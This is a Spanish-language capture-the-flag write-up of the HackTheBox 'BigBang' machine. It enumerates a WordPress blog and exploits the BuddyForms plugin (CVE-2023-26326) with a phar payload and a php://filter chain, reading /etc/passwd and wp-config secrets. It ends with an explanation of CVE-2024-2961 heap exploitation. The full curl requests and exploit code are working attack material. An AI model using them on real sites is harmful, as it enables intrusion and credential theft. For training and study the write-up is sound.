
## Enumeration

## Port 80 - Blog.bigbang.htb
Al entrar en el puerto 80 se redirige automaticamente al subdominio http://blog.bigbang.htb/ por lo que lo guardamos en el '/etc/hosts'
```bash
echo "10.10.11.52 blog.bigbang.htb" >> /etc/hosts
```


En el puerto 80 nos encontramos un blog de wordpress:
```java
➜  BigBang wappalyzer -i http://blog.bigbang.htb
http://blog.bigbang.htb Apache HTTP Server v2.4.62, Debian, PHP v8.3.2, WordPress v6.5.4, Backbone.js v1.5.0, Clipboard.js, jQuery v3.7.1, jQuery Migrate v3.4.1, TinyMCE v4, Underscore.js v1.13.4, core-js v3.35.1, Dropzone v5.7.0, jQuery UI v1.13.2, Lodash v1.13.6, MediaElement.js v4.2.17, mOxie, Select2, Twitter Emoji (Twemoji), RSS
```

![[Pasted image 20250131121917.png]]

### Fuzzing 

Vamos a fuzzear el wordpress para encontrar archivos accesibles interesantes:

```bash
➜  BigBang find /usr/share/seclists/ -type f -iname 'wordpress*'

/usr/share/seclists/Passwords/Honeypot-Captures/wordpress-attacks-july2014.txt
/usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/wordpress.txt
/usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/wordpress-all-levels.txt
/usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt
➜  BigBang feroxbuster -u http://blog.bigbang.htb -w /usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt

200      GET      182l      398w     3834c http://blog.bigbang.htb/wp-admin/css/color-picker.css
200      GET      384l     3177w    19915c http://blog.bigbang.htb/license.txt
200      GET        1l        1w        2c http://blog.bigbang.htb/wp-admin/admin-footer.php
200      GET        2l     1375w    58586c http://blog.bigbang.htb/wp-admin/css/customize-controls-rtl.min.css
200      GET      397l      781w     6223c http://blog.bigbang.htb/wp-admin/css/install-rtl.css
200      GET      396l      775w     6190c http://blog.bigbang.htb/wp-admin/css/install.css
200      GET      479l     1182w    12597c http://blog.bigbang.htb/wp-admin/css/customize-widgets-rtl.css
200      GET     2037l     3990w    37699c http://blog.bigbang.htb/wp-admin/css/edit.css
200      GET       16l       36w      490c http://blog.bigbang.htb/wp-admin/css/wp-admin-rtl.css
200      GET       16l       36w      490c http://blog.bigbang.htb/wp-admin/css/wp-tables.min.css

etc...
```

Para una busqueda mas detallada del wordpress podemos usar [WpScan](https://wpscan.com/) que es una herramienta que nos permite buscar vulnerabilidades de wordpress


```bash
[+] URL: http://blog.bigbang.htb/ [10.10.11.52]
[+] Started: Fri Jan 31 13:23:49 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.62 (Debian)
 |  - X-Powered-By: PHP/8.3.2
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://blog.bigbang.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://blog.bigbang.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://blog.bigbang.htb/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://blog.bigbang.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.5.4 identified (Insecure, released on 2024-06-05).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blog.bigbang.htb/?feed=rss2, <generator>https://wordpress.org/?v=6.5.4</generator>
 |  - http://blog.bigbang.htb/?feed=comments-rss2, <generator>https://wordpress.org/?v=6.5.4</generator>

[+] WordPress theme in use: twentytwentyfour
 | Location: http://blog.bigbang.htb/wp-content/themes/twentytwentyfour/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://blog.bigbang.htb/wp-content/themes/twentytwentyfour/readme.txt
 | [!] The version is out of date, the latest version is 1.3
 | [!] Directory listing is enabled
 | Style URL: http://blog.bigbang.htb/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blog.bigbang.htb/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.1'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] buddyforms
 | Location: http://blog.bigbang.htb/wp-content/plugins/buddyforms/
 | Last Updated: 2025-01-30T02:58:00.000Z
 | [!] The version is out of date, the latest version is 2.8.15
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 2.7.7 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://blog.bigbang.htb/wp-content/plugins/buddyforms/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:02 <===============================================================================================================================================================> (137 / 137) 100.00% Time: 00:00:02

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Jan 31 13:24:01 2025
[+] Requests Done: 171
[+] Cached Requests: 5
[+] Data Sent: 44.029 KB
[+] Data Received: 778.725 KB
[+] Memory used: 296.125 MB
[+] Elapsed time: 00:00:12
➜  BigBang 


```


Segun el Recon tenemos diferentes vectores de ataque:

Vectores:
	1.Wordpress V 6.5.4 (insecure)
		La version de wordpress esta desactualizada.
		[Info](https://www.tenable.com/plugins/was/114353)
	2.XML-RPC Habilitado
		Con ello podemos:
		Brute-forcing credenciales usando el xmlrpc.php endpoint.
		Amplificar los DoS.
		Ataques de Pingback (denial of service)
	3. Pluggin buddyforms desactualizado
		Vulnerable a [CVE-2023-26326](https://nvd.nist.gov/vuln/detail/CVE-2023-26326)
    4. El Theme de Wordpress 'twentytwentyfour'
	    Tiene la version desactualizada la actual ultima version es la  1.3
		Tiene el Directory listing habilitado, en la siguiente [ruta](https://wordpress.org/themes/twentytwentyfour/)

### Apis
Encontramos varias API's a los que el servidor envia peticiones:

```ruby
http://blog.bigbang.htb/wp-admin/admin-ajax.php
http://blog.bigbang.htb/wp-admin/upload.php
```

### Wordpress Plugin | BuddyForms 

[articulo](https://medium.com/tenable-techblog/wordpress-buddyforms-plugin-unauthenticated-insecure-deserialization-cve-2023-26326-3becb5575ed8)
#### [CVE-2023-26326](https://nvd.nist.gov/vuln/detail/CVE-2023-26326)

Bueno esta vulnerabilidad cosniste en subir un archivo .phar malicioso mediante `upload_image_from_url` y luego llamarlo con el wrapper phar://

Pruebo primero a subir un gif para verificar que funciona el exploit; el codigo defectuoso se puede examinar en este [enlace](https://github.com/BuddyForms/BuddyForms/blob/master/includes/functions.php#L1488);
A pesar de subirse el archivo en formato .png podemos observar que el gif funciona en la pagina por lo que podremos subir un archivo phar malicioso que el servidor interprete como GIF

![[Pasted image 20250202141748.png]]

dado esto procedemos  construir un exploit php
```php
<?php  
  
class Evil{  
  public function __wakeup() : void {  
    die("Arbitrary Deserialization");  
  }  
}  
  
  
//create new Phar  
$phar = new Phar('evil.phar');  
$phar->startBuffering();  
$phar->addFromString('test.txt', 'text');  
$phar->setStub("GIF89a\n<?php __HALT_COMPILER(); ?>");  
  
// add object of any class as meta data  
$object = new Evil();  
$phar->setMetadata($object);  
$phar->stopBuffering();
```

Lo convertimos  a phar:
```bash
php --define phar.readonly=0 evil.php
➜  CVE-2023-26326 strings evil.phar 
GIF89a
<?php __HALT_COMPILER(); ?>
O:4:"Evil":0:{}
test.txt
text
GBMB
```

Gif89a son los magic bytes  que van a enganar a la funcion del buddyforms `upload_image_from_url()` de tal forma que podremos exfiltrar nuestro php disfrazado de gif;

Ahora lo subimos al endpoint vulnerable que admite PUT
`wp-admin/admin-ajax.php`

![[Pasted image 20250131141905.png]]
El servidor nos devuelve una URL indicando donde se ha subido nuestro archivo malicioso; Comprobamos que se ha subido correctamente navegando a la URL
`http://blog.bigbang.htb/wp-content/uploads/2025/01/`

![[Pasted image 20250131142115.png]]


Bueno pues tenemos injecion exitosa de archivos . ahora a construir el payload;



Dado que continuo este writeup de nuevo dia he vuelto a subir el phar al servidor esta vez se guarda como 1-2.png dado que no puedo 

![[Pasted image 20250202143150.png]]
## **arbitrary file read**
[Git](https://github.com/ambionics/wrapwrap)

Vamos a usar wrapwrap para disfrazar el /etc/password en un archivo GIF anadiendo el GIF89a Header:
```bash
(venv) ➜  wrapwrap git:(main) ✗ python3 wrapwrap.py -h
usage: wrapwrap.py [-h] [-o OUTPUT] [-p PADDING_CHARACTER] [-f] path prefix suffix nb_bytes

Generates a php://filter wrapper that adds a prefix and a suffix to the contents of a file.

Example:

    $ ./wrapwrap.py /etc/passwd '<root><test>' '</test></root>' 100
    [*] Dumping 108 bytes from /etc/passwd.
    [+] Wrote filter chain to chain.txt (size=88781).
    $ php -r 'echo file_get_contents(file_get_contents("chain.txt"));'
    <root><test>root:x:0:0:root:/root:/bin/bash=0Adaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin=0Abin:x:2:2:bin:/bin:/usr/</test></root>

positional arguments:
  path                  Path to the file
  prefix                A string to write before the contents of the file
  suffix                A string to write after the contents of the file
  nb_bytes              Number of bytes to dump. It will be aligned with 9

options:
  -h, --help            show this help message and exit
  -o OUTPUT, --output OUTPUT
                        File to write the payload to. Defaults to chain.txt
  -p PADDING_CHARACTER, --padding-character PADDING_CHARACTER
                        Character to pad the prefix and suffix. Defaults to `M`.
  -f, --from-file       If set, prefix and suffix indicate files to load their value from,
                        instead of the value itself

```

Modificamos la **evil_url** para utilizar la cadena generada por **wrapwrap** , luego sube el archivo a través del endpoint vulnerable. Este método evita la restricción de tipo de archivo engañando al servidor para que interprete el archivo como una imagen. Con este enfoque, podemos realizar lectura de archivos arbitrarios y filtrar el contenido del archivo subido, que se supone que es una "imagen".

```bash
(venv) ➜  wrapwrap git:(main) ✗ python3 wrapwrap.py '/etc/passwd' 'GIF89a' '' 500000 
[!] Ignoring nb_bytes value since there is no suffix
[+] Wrote filter chain to chain.txt (size=1444).
(venv) ➜  wrapwrap git:(main) ✗ cat chain.txt 
───────┬──────────────────────────────────────────────────────────────────────────────────────
       │ File: chain.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────
   1   │ php://filter/convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSGB2312.UTF-
       │ 32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-
       │ 32LE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv
       │ .CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.i
       │ conv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF
       │ 7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_
       │ JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.i
       │ conv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775
       │ |convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L6.
       │ UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|co
       │ nvert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert
       │ .iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.b
       │ ase64-encode|convert.iconv.855.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSI
       │ SO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|conv
       │ ert.base64-encode|convert.iconv.855.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.
       │ IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|con
       │ vert.base64-encode|convert.iconv.855.UTF7|convert.base64-decode/resource=/etc/passwd
───────┴───────────────────────────────────────
```


Ahora modificamos la **evil_url** para utilizar la cadena generada por **wrapwrap** , luego súbela a través del punto de entrada vulnerable. Esto evita la restricción de tipo de archivo al engañar al servidor para que interprete el archivo como una imagen. Con este método, podemos realizar con éxito la lectura de archivos arbitrarios, filtrando los contenidos del archivo subido (que se interpreta como una "imagen").


```bash
wrapwrap git:(main) ✗ export evil_url="$(cat chain.txt )" 

wrapwrap git:(main) ✗ curl 'http://blog.bigbang.htb/wp-admin/admin-ajax.php' \
-H 'Content-Type: application/x-www-form-urlencoded' \
-d "action=upload_image_from_url&id=1&accepted_files=image/gif&url=${evil_url}"

{"status":"OK","response":"http:\/\/blog.bigbang.htb\/wp-content\/uploads\/2025\/02\/1-4.png","attachment_id":159}%        

(venv) ➜  wrapwrap git:(main) ✗ curl 'http://blog.bigbang.htb//wp-content//uploads//2025//02//1-4.png' -o exploited.png
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   843  100   843    0     0   7500      0 --:--:-- --:--:-- --:--:--  7526
(venv) ➜  wrapwrap git:(main) ✗ strings exploited.png 
GIF89aroot:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologi

```

Parece que estamos en un contenedor docker al no haber mas usuarios que root con el bash; 
vamos a intentar leer el wp-config con el mismo procedimiento:
```bash
(venv) ➜  wrapwrap git:(main) ✗ python3 wrapwrap.py '../wp-config.php' 'GIF89a' '' 500000
[!] Ignoring nb_bytes value since there is no suffix
[+] Wrote filter chain to chain.txt (size=1449).
(venv) ➜  wrapwrap git:(main) ✗ export evil_url="$(cat chain.txt )"                     
(venv) ➜  wrapwrap git:(main) ✗ curl 'http://blog.bigbang.htb/wp-admin/admin-ajax.php' \
-H 'Content-Type: application/x-www-form-urlencoded' \
-d "action=upload_image_from_url&id=1&accepted_files=image/gif&url=${evil_url}"

{"status":"OK","response":"http:\/\/blog.bigbang.htb\/wp-content\/uploads\/2025\/02\/1-5.png","attachment_id":160}%  

(venv) ➜  wrapwrap git:(main) ✗ curl 'http://blog.bigbang.htb//wp-content//uploads//2025//02//1-5.png' -o wpconfig.png
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3348  100  3348    0     0  22633      0 --:--:-- --:--:-- --:--:-- 22775


(venv) ➜  wrapwrap git:(main) ✗ strings wpconfig.png 
GIF89a<?php
 * The base configuration for WordPress
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the website, you can copy this file to "wp-config.php"
 * and fill in the values.
 * This file contains the following configurations:
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 * @link https://wordpress.org/documentation/article/editing-wp-config-php/
 * @package WordPress
// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );
/** Database username */
define( 'DB_USER', 'wp_user' );
/** Database password */
define( 'DB_PASSWORD', 'wp_password' );
/** Database hostname */
define( 'DB_HOST', '172.17.0.1' );
/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );
/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
/**#@+
 * Authentication unique keys and salts.
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 * @since 2.6.0
define( 'AUTH_KEY',         '(6xl?]9=.f9(<(yxpm9]5<wKsyEc+y&MV6CjjI(0lR2)_6SWDnzO:[g98nOOPaeK' );
define( 'SECURE_AUTH_KEY',  'F<3>KtCm^zs]Mxm Rr*N:&{SWQexFn@ wnQ+bTN5UCF-<gMsT[mH$m))T>BqL}%8' );
define( 'LOGGED_IN_KEY',    ':{yhPsf}tZRfMAut2$Fcne/.@Vs>uukS&JB04 Yy3{`$`6p/Q=d^9=ZpkfP,o%l]' );
define( 'NONCE_KEY',        'sC(jyKu>gY(,&: KS#Jh7x?/CB.hy8!_QcJhPGf@3q<-a,D#?!b}h8 ao;g[<OW;' );
define( 'AUTH_SALT',        '_B& tL]9I?ddS! 0^_,4M)B>aHOl{}e2P(l3=!./]~v#U>dtF7zR=~LnJtLgh&KK' );
define( 'SECURE_AUTH_SALT', '<Cqw6ztRM/y?eGvMzY(~d?:#]v)em`.H!SWbk.7Fj%b@Te<r^^Vh3KQ~B2c|~VvZ' );
define( 'LOGGED_IN_SALT',   '_zl+LT[GqIV{*Hpv>]H:<U5oO[w:]?%Dh(s&Tb-2k`1!WFqKu;elq7t^~v7zS{n[' );
define( 'NONCE_SALT',       't2~PvIO1qeCEa^+J}@h&x<%u~Ml{=0Orqe]l+DD7S}%KP}yi(6v$mHm4cjsK,vCZ' );
/**#@-*/
 * WordPress database table prefix.
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
$table_prefix = 'wp_';
 * For developers: WordPress debugging mode.
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 * @link https://wordpress.org/documentation/article/debugging-in-wordpress/
define( 'WP_DEBUG', false );
/* Add any custom values between this line and the "stop editing" line. */
/* That's all, stop editing! Happy publishing. */
/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';


```

Confirmamos que es un container dado que la base de datos se encuentra alojada en la 172.17.0.1 que es un rango IP que usa docker por defecto; vamos a sacar el wp-settings.php

```bash
(venv) ➜  wrapwrap git:(main) ✗ python3 wrapwrap.py '../wp-settings.php' 'GIF89a' '' 500000
[+] Wrote filter chain to chain.txt (size=1451).

(venv) ➜  wrapwrap git:(main) ✗ curl 'http://blog.bigbang.htb/wp-admin/admin-ajax.php' \
-H 'Content-Type: application/x-www-form-urlencoded' \
-d "action=upload_image_from_url&id=1&accepted_files=image/gif&url=${evil_url}"

{"status":"OK","response":"http:\/\/blog.bigbang.htb\/wp-content\/uploads\/2025\/02\/1-6.png","attachment_id":161}%  

(venv) ➜  wrapwrap git:(main) ✗ curl 'http://blog.bigbang.htb//wp-content//uploads//2025//02//1-5.png' -o wpsettings.png
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3348  100  3348    0     0   1592      0  0:00:02  0:00:02 --:--:--  1592
(venv) ➜  wrapwrap git:(main) ✗ python3 wrapwrap.py '../wp-settings.php' 'GIF89a' '' 500000
(venv) ➜  wrapwrap git:(main) ✗ strings wpsettings.png 

GIF89a<?php
 * The base configuration for WordPress
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the website, you can copy this file to "wp-config.php"
 * and fill in the values.
 * This file contains the following configurations:
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 * @link https://wordpress.org/documentation/article/editing-wp-config-php/
 * @package WordPress
// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );
/** Database username */
define( 'DB_USER', 'wp_user' );
/** Database password */
define( 'DB_PASSWORD', 'wp_password' );
/** Database hostname */
define( 'DB_HOST', '172.17.0.1' );
/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );
/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
/**#@+
 * Authentication unique keys and salts.
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 * @since 2.6.0
define( 'AUTH_KEY',         '(6xl?]9=.f9(<(yxpm9]5<wKsyEc+y&MV6CjjI(0lR2)_6SWDnzO:[g98nOOPaeK' );
define( 'SECURE_AUTH_KEY',  'F<3>KtCm^zs]Mxm Rr*N:&{SWQexFn@ wnQ+bTN5UCF-<gMsT[mH$m))T>BqL}%8' );
define( 'LOGGED_IN_KEY',    ':{yhPsf}tZRfMAut2$Fcne/.@Vs>uukS&JB04 Yy3{`$`6p/Q=d^9=ZpkfP,o%l]' );
define( 'NONCE_KEY',        'sC(jyKu>gY(,&: KS#Jh7x?/CB.hy8!_QcJhPGf@3q<-a,D#?!b}h8 ao;g[<OW;' );
define( 'AUTH_SALT',        '_B& tL]9I?ddS! 0^_,4M)B>aHOl{}e2P(l3=!./]~v#U>dtF7zR=~LnJtLgh&KK' );
define( 'SECURE_AUTH_SALT', '<Cqw6ztRM/y?eGvMzY(~d?:#]v)em`.H!SWbk.7Fj%b@Te<r^^Vh3KQ~B2c|~VvZ' );
define( 'LOGGED_IN_SALT',   '_zl+LT[GqIV{*Hpv>]H:<U5oO[w:]?%Dh(s&Tb-2k`1!WFqKu;elq7t^~v7zS{n[' );
define( 'NONCE_SALT',       't2~PvIO1qeCEa^+J}@h&x<%u~Ml{=0Orqe]l+DD7S}%KP}yi(6v$mHm4cjsK,vCZ' );
/**#@-*/
 * WordPress database table prefix.
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
$table_prefix = 'wp_';
 * For developers: WordPress debugging mode.
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 * @link https://wordpress.org/documentation/article/debugging-in-wordpress/
define( 'WP_DEBUG', false );
/* Add any custom values between this line and the "stop editing" line. */
/* That's all, stop editing! Happy publishing. */
/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```



  
CVE-2024–2961 | Buffer Overflow

Vamos a explotar la  vulnerabilidad **CVE-2024–2961** , un buffer overflow presente en la biblioteca GNU `libiconv`. Esta vulnerabilidad permite ejecución remota de código (RCE) debido a una mala validación de entrada durante la conversión entre conjuntos de caracteres. Aunque el exploit es complejo y requiere conocimientos avanzados de explotación binaria, intentaremos desglosarlo paso a paso para facilitar su comprensión.

La vulnerabilidad fue descubierta en el contexto del plugin **BuddyForms** de WordPress, lo que la hace especialmente relevante para ataques web. Vamos a analizar cómo funciona esta vulnerabilidad desde una perspectiva técnica, centrándonos en los conceptos clave necesarios para su explotación.
## Vulnerabilidad: Buffer Overflow en `libiconv`

### Contexto Técnico

`libiconv` es una biblioteca utilizada para convertir texto entre diferentes conjuntos de caracteres (charset). En PHP, muchas funciones de manipulación de cadenas dependen de esta biblioteca, especialmente cuando se usa la función `iconv()`. La vulnerabilidad radica en cómo `libiconv` maneja ciertos caracteres exóticos en el conjunto de caracteres **ISO-2022-CN-EXT** .

#### ¿Qué es ISO-2022-CN-EXT?

El conjunto de caracteres **ISO-2022-CN-EXT** utiliza secuencias de escape (`ESC` bytes, como `\x1B`) para cambiar dinámicamente entre diferentes codificaciones de caracteres. Cada carácter puede requerir hasta **4 bytes** :

- **2 bytes** para la secuencia de escape.
- **2 bytes** para el carácter codificado.

Por ejemplo:

- El carácter `劄` podría ser codificado como `ESC $ * H` (en formato hexadecimal: `\x1B\x24\x2A\x48`).

Cuando `libiconv` procesa estos caracteres, debe escribir 4 bytes en el búfer de salida. Sin embargo, **falta una verificación adecuada del tamaño del búfer** , lo que puede provocar un desbordamiento de búfer si no hay suficiente espacio disponible.

### PHP Heap: Cómo Funciona

Antes de profundizar en la explotación, es importante entender cómo funciona el manejo de memoria en PHP:

#### 1. **Asignación de Memoria**

PHP utiliza funciones como `emalloc(N)` para asignar bloques de memoria de tamaño `N` y devuelve un puntero a esa memoria. Cuando un bloque ya no es necesario, se libera con `efree(ptr)`.

#### 2. **Estructura del Montón (Heap)**

El montón de PHP está dividido en regiones de **2MB** , subdivididas en páginas de **4KB (0x1000 bytes)** . Cada página almacena bloques (chunks) de un tamaño específico:

- Página 10: Bloques de **0x100 bytes** .
- Página 11: Bloques de **0x38 bytes** .
- Y así sucesivamente...

No hay metadatos entre bloques para rastrear asignaciones, lo que lo hace eficiente pero vulnerable a desbordamientos, ya que no hay verificaciones de seguridad entre bloques en el montón.

#### 3. **Gestión de Listas Libres**

Los bloques liberados se añaden a listas libres (free lists), que son listas enlazadas simples (inseguras comparadas con listas doblemente enlazadas). Cuando se llama a `efree(ptr)`, el bloque se agrega al inicio de la lista libre (comportamiento LIFO).

Si ocurre un desbordamiento en un bloque adyacente, se puede sobrescribir el puntero almacenado en el primer byte del bloque libre, alterando la estructura de la lista libre. Esto permite controlar dónde se asignará el siguiente bloque, lo que es crítico para la explotación.

---

### php://filter:

El protocolo `php://filter` es ampliamente utilizado para aplicar filtros a recursos locales o remotos. Vamos a entender cómo PHP maneja este mecanismo:

#### 1. **Flujos y Cubetas (Streams and Buckets)**

Cuando PHP lee un recurso (por ejemplo, `/etc/passwd`), lo carga en un flujo representado por una **brigada de cubetas (bucket brigade)** :

- Una brigada de cubetas es una lista enlazada doble de cubetas, donde cada cubeta contiene un búfer con una parte de los datos del recurso.
- Ejemplo: `/etc/passwd` podría estar dividido en:
    - Cubeta 1: Primeros 5 bytes.
    - Cubeta 2: Siguientes 30 bytes.
    - Cubeta 3: Siguientes 1000 bytes.

#### 2. **Procesamiento de Filtros**

Los filtros (como `string.upper`) se aplican a las cubetas uno por uno:

- PHP procesa cada cubeta, asignando un búfer de salida del mismo tamaño que el búfer de entrada.
- Por ejemplo, si el filtro es `string.upper`, los caracteres minúsculos en el búfer de entrada se convierten a mayúsculas en el búfer de salida.
- Se crea una nueva cubeta para los datos procesados.

#### 3. **Cadena de Filtros**

Una vez que se procesa una cubeta con un filtro, se crea una nueva brigada de cubetas con los resultados. El siguiente filtro se aplica a esta nueva brigada. Este proceso continúa hasta que todos los filtros se han aplicado.

Este mecanismo introduce potenciales vulnerabilidades:

- Los filtros procesan datos en bloques, lo que los hace susceptibles a desbordamientos de búfer si las verificaciones de tamaño son insuficientes.
- Las cadenas de filtros aumentan la complejidad, permitiendo a los atacantes crear payloads intrincados.

---

### Explotación del Desbordamiento

Nuestro objetivo es aprovechar la vulnerabilidad de desbordamiento de búfer en el filtro `convert.iconv.XXX.ISO-2022-CN-EXT` para lograr ejecución remota de código (RCE).

### 1. **Lectura Arbitraria de Archivos**

Con la explotación anterior, obtenemos la capacidad de leer archivos arbitrarios. Esto nos permite:

- Leer binaries críticos como PHP, Apache y bibliotecas compartidas (ejemplo: `libc`) para análisis.
- Filtrar la distribución de memoria (`/proc/self/maps`) para revelar la disposición de la memoria del proceso en ejecución. Esto evita ASLR (Randomización del Espacio de Direcciones) y PIE (Ejecutables Independientes de Posición).

### 2. **Manipulación Arbitraria del Montón**

A través del abuso de las cubetas, podemos asignar y liberar búferes casi arbitrariamente:

- Usar `zlib.inflate` para crear múltiples cubetas.
- Redimensionar las cubetas con `dechunk` para alinearlas con los tamaños de bloques en el montón (por ejemplo, 0x100).
- Manipular la lista libre mediante la asignación, liberación y sobrescritura de punteros.

### 3. **Técnica de Muñeca Rusa**

Esta técnica permite manipular las cubetas de manera precisa para preparar la explotación (pon que las cubetas son muñequitas rusas ):

- Lograr control total sobre qué escribir y dónde (`write-what-where`).
- Ejecutar comandos arbitrarios.

---

## Flujo Final del Ataque

1. **Solicitud 1** : Leer `/proc/self/maps` para filtrar:
    
    - La disposición de memoria del proceso PHP (incluyendo la dirección del montón).
    - La dirección base de `libc` para usar técnicas ROP.
    
2. **Solicitud 2** : Descargar la versión coincidente de `libc` para extraer la dirección de la función `system()` y habilitar la ejecución de comandos arbitrarios con `system('/bin/sh')`.
    
